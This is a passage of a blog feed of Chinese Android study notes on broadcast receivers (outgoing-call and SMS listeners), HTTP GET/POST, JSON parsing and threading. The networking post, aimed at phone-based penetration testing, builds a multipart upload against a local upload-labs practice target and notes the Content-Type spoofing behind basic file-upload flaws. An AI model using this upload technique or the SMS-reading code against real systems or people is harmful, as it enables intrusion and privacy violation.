<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.android_study17;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBroad</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">		Toast.makeText(context, <span class="string">"reciver"</span>+intent.getStringExtra(<span class="string">"key"</span>), Toast.LENGTH_SHORT).show();</span><br><span class="line">		<span class="comment">//String str = getResultData();</span></span><br><span class="line">		<span class="comment">//setResultData("179521"+str);</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>（注意这个类要用public修饰，内部的话呢还要用static修饰）（静态注册的时候）<br>传进来的intent是用来传输对象的，context就是上下文，我们可以通过获取结果数据<code>getResultData</code>，然后添加需要的东西<code>setResultData</code>进行数据改变。<br>我们写好这个类之后，我们就要进行配置，我们要监听手机拨号这个广播：<br>首先我们要先获取相对应的权限：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.PROCESS_OUTGOING_CALLS"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>有了权限之后，我们就需要配置接受者了：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">"com.example.android_study17.MyBroad"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.NEW_OUTGOING_CALL"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>receiver的名称是我们的类名，<br>有了包名就不需要写全了：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">"com.example.android_study17"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:versionCode</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:versionName</span>=<span class="string">"1.0"</span> &gt;</span></span><br></pre></td></tr></table></figure>
<p>有了package其实就不需要写全名了。下面的intent-filter里面写的那个是你要收听广播的名称。<br>之后我们一要打电话了就可以进行数据的获取了。<br>静态注册的优点就是即使你关闭了程序，我们的类还是能够收听广播，而缺点就是因为一直收听所以只有卸载了才不会收听了。</p>
<h2 id="动态注册"><a href="#动态注册" class="headerlink" title="动态注册"></a>动态注册</h2><p>动态注册是根据需要在什么时候开始和结束监听：<br>注册：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">IntentFilter filter = <span class="keyword">new</span> IntentFilter();</span><br><span class="line">filter.addAction(<span class="string">"android.intent.action.NEW_OUTGOING_CALL"</span>);</span><br><span class="line">br = <span class="keyword">new</span> MyBroad();</span><br><span class="line">registerReceiver(br,filter );</span><br></pre></td></tr></table></figure>
<p>注册好之后，我们也是可以注销的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">unregisterReceiver(br);</span><br></pre></td></tr></table></figure>
<p>动态注册的那个类没必要是public的，动态注册的优点就是灵活性高一些，但是程序关闭之后就算你没有注销广播，他一样还是会自动注销的，也就是说你收听不到了。</p>
<h2 id="发送广播"><a href="#发送广播" class="headerlink" title="发送广播"></a>发送广播</h2><p>就是我们给广播接收者发送广播：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">intent.setAction(<span class="string">"wker666.github.io"</span>);</span><br><span class="line">intent.putExtra(<span class="string">"key"</span>, <span class="string">"wker"</span>);</span><br><span class="line"><span class="comment">//sendBroadcast(intent);</span></span><br><span class="line">sendBroadcast(intent,<span class="string">"com.wker.permission.xxx"</span>);</span><br></pre></td></tr></table></figure>
<p>首先是这个intent可以带数据，我们要先进行设置域名，重载的方法有第二个参数，这个就是要求我们拥有的权限，所以我们要进行权限的分配，因为是我们自定义的权限，所以我们需要线进行全线的声明，然后再授权：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">permission</span> <span class="attr">android:name</span>=<span class="string">"com.wker.permission.xxx"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"com.wker.permission.xxx"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个样子就可以了，我们要接受这个广播的话呢，我们就要在动态或者静态注册中设置设个intent的URI：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">filter.addAction(<span class="string">"wker666.github.io"</span>);</span><br></pre></td></tr></table></figure>
<p>发送广播的时候分为两种，一种是有序的，还有一种是无序的。</p>
<ol>
<li>无序的就是用<code>sendBroadcast</code>方法，他是异步执行，不能够使用哪个get，set方法还有<code>abortBroadcast</code>方法。</li>
<li>有序的就是有执行先后顺序的执行，可以使用上面的方法，会根据广播接收者的优先级进行收听。</li>
</ol>
<ul>
<li>动态设置优先级：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">filter.setPriority(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></li>
<li>静态设置优先级<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">intent-filter</span> <span class="attr">android:priority</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.NEW_OUTGOING_CALL"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br></pre></td></tr></table></figure>
优先级相同时，在AndroidManifest.xml先注册的先运行。<br>优先级从-1000到+1000，数值越大优先级越大。</li>
</ul>
<p>在有序中，我们使用get，set方法设置的参数，是因为我们调用的重载的这个API方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sendOrderedBroadcast(intent, receiverPermission, resultReceiver, scheduler, initialCode, initialData, initialExtras);</span><br></pre></td></tr></table></figure>
<p>第三个参数是最后一个执行的广播接收者。</p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>一个监视短信接收的实例，首先我们需要配置我们的权限：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.RECEIVE_SMS"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们有了权限之后我们就要编写我们的类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.android_study18;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.telephony.SmsMessage;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SMSReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">		Log.d(<span class="string">"wker"</span>, <span class="string">"receiver SMS"</span>);</span><br><span class="line">		Bundle bundle = intent.getExtras();</span><br><span class="line">		<span class="comment">//短信数组</span></span><br><span class="line">		Object[] object = (Object[]) bundle.get(<span class="string">"pdus"</span>);</span><br><span class="line">		<span class="keyword">for</span>(Object obj:object)</span><br><span class="line">		&#123;</span><br><span class="line">			SmsMessage pdu = SmsMessage.createFromPdu((<span class="keyword">byte</span>[])obj);</span><br><span class="line">			Log.d(<span class="string">"wker"</span>, pdu.getOriginatingAddress());</span><br><span class="line">			Log.d(<span class="string">"wker"</span>, pdu.getMessageBody());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个就是说，我们接受到短信之后我们就可以连同着获得intent携带者的bundle对象，通过这个对象获取键为“pdus”的值，然后强转为object数组，这个数组里面有我们需要的信息，然后用增强for循环来遍历这个数组，通过<code>SmsMessage.createFromPdu</code>这个静态方法获取短信信息的对象，然后调用方法获得相对应的信息。<br>配置广播接收者：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">"com.example.android_study18.SMSReceiver"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.provider.Telephony.SMS_RECEIVED"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>有一点就是eclipse不会提示我们这个短信的名称，不知道为什么，测试的时候通过安卓模拟器自带的那个发短信功能就可以测试：<br><img src="img1.jpg" alt="监听短信"><br>可以发现广播接收者的优先级是高于之前的内容监听者的。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android WebStite</title>
    <url>/2020/03/07/Android-WebStite/</url>
    <content><![CDATA[<h1 id="安卓网络操作"><a href="#安卓网络操作" class="headerlink" title="安卓网络操作"></a>安卓网络操作</h1><p>以前就想写安卓的网络操作，方便在手机上进行渗透测试和挂机，这次就好好分析一下这个东西，也是和Windows下面一样，主要就是Get和POST这两种网页操作，POST的话呢还分为普通表单和文件上传表单，再就是有个json的对象。</p>
<h2 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h2><p>这个相对是最简单得了，也就是流之间的操作。<br>布局什么的我就不写了<br>首先我们还是要进行权限的分配：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>就是常用的这个Internet权限<br>因为我们不能在主线程中对网络进行操作，所以我们最方便的就是在<code>AsyncTask</code>中进行效应的操作，重写他的<code>doInBackground</code>的方法。<br>首先我们先获取对应的URL对象，通过URL对象获取<code>HttpURLConnection</code>对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">URL url = <span class="keyword">new</span> URL(params[<span class="number">0</span>]);</span><br><span class="line">HttpURLConnection connection = (HttpURLConnection)url.openConnection();</span><br></pre></td></tr></table></figure>
<p>获取完毕这个对象之后，我们来设置一下访问的基本配置，也就是超时的设置：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">connection.setConnectTimeout(<span class="number">5000</span>);<span class="comment">//连接超时</span></span><br><span class="line">connection.setReadTimeout(<span class="number">5000</span>);<span class="comment">//read读取异常</span></span><br><span class="line">connection.setDoInput(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>
<p>第一个是连接超级，第二个是读文件超时，设置之后如果超时，会抛异常的，第三个可设置也可不设置，默认就是true，可以获取返回内容。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//connection.connect();</span></span><br></pre></td></tr></table></figure>
<p>这个可以写也可以不写，这个连接其实也就是那个<code>setConnectTimeout</code>所说的那个连接，如果不写的话呢也可以，在<code>getResponseCode</code>这个方法调用的时候会判断是否有连接。，没有的话呢也就会连接的。<br>设置连接的请求方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">connection.setRequestMethod(<span class="string">"GET"</span>);</span><br></pre></td></tr></table></figure>
<p>获取相应的状态码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> code = connection.getResponseCode();</span><br></pre></td></tr></table></figure>
<p>这一步会判断是否有链接并帮助连接，返回的就是HTTP的状态码，获取完毕之后，我们就可以获取响应头部：<code>getHeaderFields().toString()</code>这个就可以获取完整的响应头。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(code == <span class="number">200</span>)</span><br><span class="line">&#123;</span><br><span class="line">	Log.d(<span class="string">"wker"</span>, connection.getHeaderFields().toString());</span><br><span class="line">	String[] type = connection.getContentType().split(<span class="string">"="</span>);</span><br><span class="line">	String encodeing=<span class="string">""</span>;</span><br><span class="line">	<span class="keyword">if</span>(type.length&gt;<span class="number">1</span>)</span><br><span class="line">		encodeing = type[<span class="number">1</span>];</span><br><span class="line">	<span class="keyword">if</span>(encodeing==<span class="string">""</span>)</span><br><span class="line">		encodeing=<span class="string">"utf-8"</span>;</span><br><span class="line">	BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(connection.getInputStream(),encodeing));</span><br><span class="line">	<span class="keyword">char</span> [] ReText = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">1024</span>];</span><br><span class="line">	<span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span>((len=br.read(ReText))!=-<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		result+=<span class="keyword">new</span> String(ReText,<span class="number">0</span>,len);</span><br><span class="line">	&#125;</span><br><span class="line">	br.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先我们先判断响应的状态码是否是200，如果是的话呢，我们就先分解编码方式，判断是什么，如果没有的话呢，我们默认设置为UTF-8的编码方式，然后我们获取字符的输入流，通过连接对象的<code>getInputStream</code>方法就可以获取，并且我们需要指定我们的编码方式，之后的读取就是常规的流读取了，最后将这个流关闭。</p>
<h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><p>这个能稍微麻烦那么一点，先说一下常规的普通表单的提交方式：</p>
<h3 id="普通表单"><a href="#普通表单" class="headerlink" title="普通表单"></a>普通表单</h3><p>和GET方式相似，不同的地方，我写出来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">connection.setRequestMethod(<span class="string">"POST"</span>);</span><br></pre></td></tr></table></figure>
<p>我们设置为POST提交方式。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">connection.setDoOutput(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>
<p>这个代表有输出，也就是POST表单内容要进行输出（也就是在协议头下面有内容）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">connection.setRequestProperty(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>);</span><br></pre></td></tr></table></figure>
<p>这个就很关键了，这个代表是POST的提交数据，设置好之后，我们饿要获取输出流：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">OutputStream os = connection.getOutputStream();</span><br><span class="line">os.write(<span class="string">"n=fanke&amp;p=fanke"</span>.getBytes(<span class="string">"UTF-8"</span>));</span><br><span class="line">os.close();</span><br></pre></td></tr></table></figure>
<p>流的操作也是比较简单，根据编码将我们的数据写入就好了。</p>
<p><em>Cookie插入</em></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">connection.setRequestProperty(<span class="string">"Cookie"</span>, <span class="string">"x=fanke"</span>);<span class="comment">//带Cookie</span></span><br></pre></td></tr></table></figure>
<p>这个其实也就是在我们的协议头带上去就好。</p>
<p>其他的都和GET类似。</p>
<h3 id="文件提交"><a href="#文件提交" class="headerlink" title="文件提交"></a>文件提交</h3><p>这个是相对而言比较难的，和前两个一样，我们先要获取链接对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">URL url = <span class="keyword">new</span> URL(<span class="string">"http://192.168.209.1/upload-labs-master/Pass-01/index.php?action=show_code"</span>);</span><br><span class="line">HttpURLConnection huc = (HttpURLConnection) url.openConnection();</span><br><span class="line">huc.setDoOutput(<span class="keyword">true</span>);</span><br><span class="line">huc.setRequestMethod(<span class="string">"POST"</span>);</span><br></pre></td></tr></table></figure>
<p>在基本上和POST是一样的。<br>下面开始有区别了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">huc.setRequestProperty(<span class="string">"Content-Type"</span>, <span class="string">"multipart/form-data; boundary="</span>+boundary);</span><br></pre></td></tr></table></figure>
<p>这个就是设置是文件的提交，比较关键的是boundary这个东西，一般是个时间戳比较好，但是不是恨死，可以自己设置，但是在下面提交的时候要多加个“–”，这是个坑。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">sb.append(<span class="string">"--"</span>+boundary+rn);</span><br><span class="line">sb.append(<span class="string">"Content-Disposition: form-data; name=\"upload_file\"; filename=\"1.jpg\""</span>+rn);</span><br><span class="line">sb.append(<span class="string">"Content-Type: image/jpeg"</span>+rn+rn);</span><br><span class="line">OutputStream opt = huc.getOutputStream();</span><br><span class="line">opt.write(sb.toString().getBytes());</span><br></pre></td></tr></table></figure>
<p>rn这个变量其实就是”\r\n”，也就是一个换行，我们用一个字符串容器将它进行包含，之后我们接上：”–”+boundary+rn，这个是固定。<br><code>sb.append(&quot;Content-Disposition: form-data; name=\&quot;upload_file\&quot;; filename=\&quot;1.jpg\&quot;&quot;+rn);</code>这个基本也是固定的，也就是这个地方容易出现文件上传的基本漏洞，抓包可以看到的，rn不要忘记带，<code>sb.append(&quot;Content-Type: image/jpeg&quot;+rn+rn);</code>这个及时设置我们是图片文件（一种上传漏洞）然后我们获取输入流。<br>写个方法将我们的文件内容上传上去：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeFile</span><span class="params">(OutputStream opt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		FileInputStream input = <span class="keyword">new</span> FileInputStream(<span class="string">"/data/1.jpg"</span>);</span><br><span class="line">		<span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">		<span class="keyword">while</span>((len=input.read(buffer))!=-<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			opt.write(buffer,<span class="number">0</span>,len);</span><br><span class="line">		&#125;</span><br><span class="line">		input.close();</span><br><span class="line">	&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个就比较常规了，就是一个文件的写入操作，我们用来将我们的文件写入我们的网络传输流中：<br><code>writeFile(opt);</code></p>
<p>我们将图片写入流中之后，写我们的结尾，下面这块有变动，是根据抓到包进行分析：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">opt.write((rn+<span class="string">"--"</span>+boundary+rn).getBytes());</span><br><span class="line">opt.write((<span class="string">"Content-Disposition: form-data; name=\"submit\""</span>+rn+rn).getBytes());</span><br><span class="line">opt.write((URLEncoder.encode(<span class="string">"上传"</span>, <span class="string">"utf-8"</span>)+rn+<span class="string">"--"</span>+boundary).getBytes());</span><br><span class="line">opt.close();</span><br></pre></td></tr></table></figure>
<p>因为文件内容和boundary有分隔，所以不要忘记rn和–，下面的是抓包抓到的，记得注意的是，编码和“rn+”–”+boundary”，最后将我们的流关掉。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> code = huc.getResponseCode();</span><br><span class="line"><span class="keyword">if</span>(code==<span class="number">200</span>)</span><br><span class="line">&#123;</span><br><span class="line">	Log.d(<span class="string">"wker"</span>, <span class="string">"上传成功"</span>);</span><br><span class="line">	Log.d(<span class="string">"wker"</span>, huc.getHeaderFields().toString());</span><br><span class="line">	String[] type = huc.getContentType().split(<span class="string">"="</span>);</span><br><span class="line">	String encodeing=<span class="string">""</span>;</span><br><span class="line">	<span class="keyword">if</span>(type.length&gt;<span class="number">1</span>)</span><br><span class="line">		encodeing = type[<span class="number">1</span>];</span><br><span class="line">	<span class="keyword">if</span>(encodeing==<span class="string">""</span>)</span><br><span class="line">		encodeing=<span class="string">"utf-8"</span>;</span><br><span class="line">	BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(huc.getInputStream(),encodeing));</span><br><span class="line">	<span class="keyword">char</span> [] ReText = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">1024</span>];</span><br><span class="line">	<span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">	String result = <span class="keyword">null</span>;</span><br><span class="line">	<span class="keyword">while</span>((len=br.read(ReText))!=-<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		result+=<span class="keyword">new</span> String(ReText,<span class="number">0</span>,len);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	Log.d(<span class="string">"wker"</span>, <span class="string">"上传失败"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码就没有什么区别了。</p>
<h2 id="JSON数据的解析"><a href="#JSON数据的解析" class="headerlink" title="JSON数据的解析"></a>JSON数据的解析</h2><p>这个操作起来不是很难，java提供给我们很好地一个类。<br><code>JSONArray</code>和<code>getJSONObject</code>这两个类，可以嵌套使用参数都是字符串，都是传进来要解析的json数据，第一个是数组，第二个是对象。<br>示例代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onPostExecute</span><span class="params">(String result)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		JSONArray ja = <span class="keyword">new</span> JSONArray(result);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;ja.length();i++)&#123;</span><br><span class="line">			JSONObject jsonObject = ja.getJSONObject(i);</span><br><span class="line">			String time = jsonObject.getString(<span class="string">"onlinetime"</span>);</span><br><span class="line">			String number = jsonObject.getString(<span class="string">"onlinenumber"</span>);</span><br><span class="line">			String change = jsonObject.getString(<span class="string">"onlinechange"</span>);</span><br><span class="line">			sb.append(<span class="string">"时间:"</span>+time+<span class="string">"数值:"</span>+number+<span class="string">"波动值:"</span>+change+rn);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (JSONException e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">	&#125;</span><br><span class="line">	ResultText.setText(sb.toString());</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>使用起来也就是这样，但是要抛出一个异常出来<br>这个就是下先获取JSON数组，然后解析数组里面的成员因为是对象类型，所以再嵌套为对象，然后通过键值进行获取。</p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>就是通过API接口分析，然后提交数据，奇趣那个网站：<br><a href="http://77tj.org/api/tencent/onlineim" target="_blank" rel="noopener">http://77tj.org/api/tencent/onlineim</a><br>返回的json对象：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="attr">"onlinetime"</span>:<span class="string">"2020-03-07 10:24:00"</span>,<span class="attr">"onlinenumber"</span>:<span class="number">323597394</span>,<span class="attr">"onlinechange"</span>:<span class="number">33184</span>&#125;,&#123;<span class="attr">"onlinetime"</span>:<span class="string">"2020-03-07 10:23:00"</span>,<span class="attr">"onlinenumber"</span>:<span class="number">323564210</span>,<span class="attr">"onlinechange"</span>:<span class="number">55485</span>&#125;,&#123;<span class="attr">"onlinetime"</span>:<span class="string">"2020-03-07 10:22:00"</span>,<span class="attr">"onlinenumber"</span>:<span class="number">323508725</span>,<span class="attr">"onlinechange"</span>:<span class="number">60889</span>&#125;,&#123;<span class="attr">"onlinetime"</span>:<span class="string">"2020-03-07 10:21:00"</span>,<span class="attr">"onlinenumber"</span>:<span class="number">323447836</span>,<span class="attr">"onlinechange"</span>:<span class="number">115561</span>&#125;,&#123;<span class="attr">"onlinetime"</span>:<span class="string">"2020-03-07 10:20:00"</span>,<span class="attr">"onlinenumber"</span>:<span class="number">323332275</span>,<span class="attr">"onlinechange"</span>:<span class="number">17549</span>&#125;,&#123;<span class="attr">"onlinetime"</span>:<span class="string">"2020-03-07 10:19:00"</span>,<span class="attr">"onlinenumber"</span>:<span class="number">323314726</span>,<span class="attr">"onlinechange"</span>:<span class="number">54134</span>&#125;,&#123;<span class="attr">"onlinetime"</span>:<span class="string">"2020-03-07 10:18:00"</span>,<span class="attr">"onlinenumber"</span>:<span class="number">323260592</span>,<span class="attr">"onlinechange"</span>:<span class="number">2632</span>&#125;,&#123;<span class="attr">"onlinetime"</span>:<span class="string">"2020-03-07 10:17:00"</span>,<span class="attr">"onlinenumber"</span>:<span class="number">323257960</span>,<span class="attr">"onlinechange"</span>:<span class="number">156081</span>&#125;,&#123;<span class="attr">"onlinetime"</span>:<span class="string">"2020-03-07 10:16:00"</span>,<span class="attr">"onlinenumber"</span>:<span class="number">323101879</span>,<span class="attr">"onlinechange"</span>:<span class="number">-7806</span>&#125;,&#123;<span class="attr">"onlinetime"</span>:<span class="string">"2020-03-07 10:15:00"</span>,<span class="attr">"onlinenumber"</span>:<span class="number">323109685</span>,<span class="attr">"onlinechange"</span>:<span class="number">81895</span>&#125;]</span><br></pre></td></tr></table></figure>
<p>我们解析也就是先传入GET，然后在UI中进行JSON的解析，上面的代码就是，最后运行的结果：<br><img src="img1.jpg" alt="示例结果"></p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Thread</title>
    <url>/2020/03/06/Android-Thread/</url>
    <content><![CDATA[<h1 id="安卓线程与进程"><a href="#安卓线程与进程" class="headerlink" title="安卓线程与进程"></a>安卓线程与进程</h1><p>这个安卓的进程其实我感觉就是一个Activity就可以自己来一个进程，在我们的AndroidManifest.xml这个文件中我们可以通过：<br><code>android:process=&quot;XXX&quot;</code>来指定我们的进程，是否要新的一个进程，这个默认就是我们的包名。</p>
<h2 id="进程优先级"><a href="#进程优先级" class="headerlink" title="进程优先级"></a>进程优先级</h2><p>因为安卓是手机的操作系统，内存少一些，所以他有个自动杀死进程的一个机制，主要是用来杀死一些不太重要的进程，在我们内存不太充足的条件下。</p>
<ul>
<li>前台进程</li>
<li>可见进程</li>
<li>服务进程</li>
<li>后台进程</li>
<li>空进程</li>
</ul>
<p>这个看名字基本就能明白，可见进程就是我们虽然不可见，其实也就是不能进行UI的操作了，比如说我们的一个程序，打的第二个Activity的时候他就变成了可见进程，空进程就是我们退出的进程，后台进程是我们虽然回到了主窗口，但是我们没有退出。<br>安卓会从下到上依次删除进程。</p>
<h2 id="handle消息处理机制"><a href="#handle消息处理机制" class="headerlink" title="handle消息处理机制"></a>handle消息处理机制</h2><p>这个东西就和Windows下面的消息循环很像，主要应对的是，子线程中我们不能对主线程的UI进行操作。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	Thread.sleep(<span class="number">2</span>*<span class="number">1000</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">	e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String str = <span class="string">"执行完毕"</span>;</span><br><span class="line">Message msg = <span class="keyword">new</span> Message();</span><br><span class="line">msg.obj = str;</span><br><span class="line">handler.sendMessage(msg);</span><br></pre></td></tr></table></figure>
<p>run方法中写这个就代码，这个handler使我们自写的。</p>
